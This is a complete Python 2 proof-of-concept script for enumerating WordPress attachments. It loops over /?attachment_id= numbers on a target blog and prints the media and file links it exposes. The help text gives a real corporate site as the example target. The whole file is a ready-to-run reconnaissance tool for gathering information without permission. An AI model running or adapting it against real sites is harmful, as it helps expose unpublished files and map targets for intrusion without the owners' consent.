import sys
import requests
from bs4 import BeautifulSoup


def enumusers(url,p):
        r = requests.get(url + '/?attachment_id=' + str(p), allow_redirects=False)
        if r.status_code == 200:
                soup = BeautifulSoup(r.text)
                div=soup.find('div',{'class':'attachment'})
                p = soup.find('p',{'class':'attachment'})

                if div != None:
                        img = div.find('img')['src']
                        print img
                if p != None:
                        link = p.find('a')['href']
                        print link
                
            
          

helpmsg = "PoC for WordPress Attachment enumeration via the /?attachment_id=<number> vulnerabiltiy.\nCreated by Riyaz Ahemed Walikar\n\nUsage: wp_attachenum.py <blog_url> [max_number_users]\n\nExample: wp_attachenum.py https://advertising.paypal.com 20\n"
if len(sys.argv) < 2:
        print "Not enough parameters.\n"
        print helpmsg
        sys.exit()
        
url = sys.argv[1]
num_u = ""
if len(sys.argv) > 2:
	if sys.argv[2].isdigit() == 1:
		num_u = sys.argv[2]
	else:
		print "Invalid count! Please specify a positive integer to enumerate upto"
	

print "Starting enumeration on " + url + "\n"

if num_u == "":
	print "No upper limit specified, enumerating the default 20 attachments"
	num_u = 20
else:
	print "Enumerating the first " + str(num_u) + " attachments\n"

    
for i in range(1,int(num_u)+1):
	enumusers(url,i)
sys.exit()

    
print "Invalid parameters.\n"
print helpmsg
sys.exit()
